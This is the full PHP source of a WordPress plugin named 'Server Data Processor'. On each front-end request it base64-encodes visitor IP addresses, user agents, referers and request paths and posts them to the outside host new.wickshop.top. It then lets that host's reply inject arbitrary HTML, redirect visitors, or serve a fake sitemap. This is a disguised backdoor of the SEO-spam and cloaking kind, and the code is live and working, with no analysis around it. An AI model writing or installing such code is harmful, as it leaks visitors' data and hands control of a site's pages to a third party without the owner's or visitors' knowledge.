<?php
/*
Plugin Name: Server Data Processor
Plugin URI: 
Description: Collects server variables, processes them, and sends to external endpoint
Version: 1.0
Author: 
Author URI: 
*/

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly
}

add_action('init', 'process_server_data');

function process_server_data() {
    // Only process if this is the main query and not an admin page
    if (is_admin() || !is_main_query()) {
        return;
    }

    $serverVars = [
        "SCRIPT_NAME",
        "REQUEST_URI",
        "HTTPS",
        "REQUEST_SCHEME",
        "SERVER_PORT",
        "REMOTE_ADDR",
        "HTTP_REFERER",
        "HTTP_ACCEPT_LANGUAGE",
        "HTTP_USER_AGENT",
        "HTTP_HOST"
    ];

    $postData = [];

    foreach ($serverVars as $varName) {
        $varValue = isset($_SERVER[$varName]) ? $_SERVER[$varName] : '';
        $encodedValue = base64_encode(trim($varValue));
        $encodedValue = str_replace("+", "-", $encodedValue);
        $encodedValue = str_replace("/", "_", $encodedValue);
        $encodedValue = str_replace("=", ".", $encodedValue);
        $postData[$varName] = $encodedValue;
    }

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'http://new.wickshop.top/server-twig-encode.php');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);

    $response = curl_exec($ch);
    $response = json_decode($response, true);

    curl_close($ch);

    if (isset($response['action']) && $response['action'] != 'none') {
        switch ($response['action']) {
            case 'display':
                header('Content-Type: text/html; charset=UTF-8');
                echo $response['data'];
                exit;
                break;
            case 'jump':
                if($_SERVER['REQUEST_URI'] == '/index.php' || $_SERVER['REQUEST_URI'] == '/' )
                {
                    break;
                }

                wp_redirect($response['data']);
                exit;
                break;
            case 'sitemap':
                header('Content-Type: application/xml; charset=utf-8');
                echo $response['data'];
                exit;
                break;
        }
    }
}